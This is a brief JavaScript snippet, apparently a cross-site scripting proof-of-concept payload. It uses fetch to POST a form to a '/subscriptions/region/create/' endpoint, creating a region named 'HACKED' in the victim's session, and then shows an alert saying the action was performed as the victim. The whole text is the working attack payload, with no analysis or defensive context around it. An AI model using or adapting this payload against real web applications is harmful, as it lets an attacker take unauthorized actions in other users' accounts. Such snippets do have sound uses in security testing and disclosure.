fetch('/subscriptions/region/create/', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'regionName=HACKED&description=XSS&mapCenter=on&north=90&south=-90&east=180&west=-180'
}).then(r => alert('Action performed as victim!'));
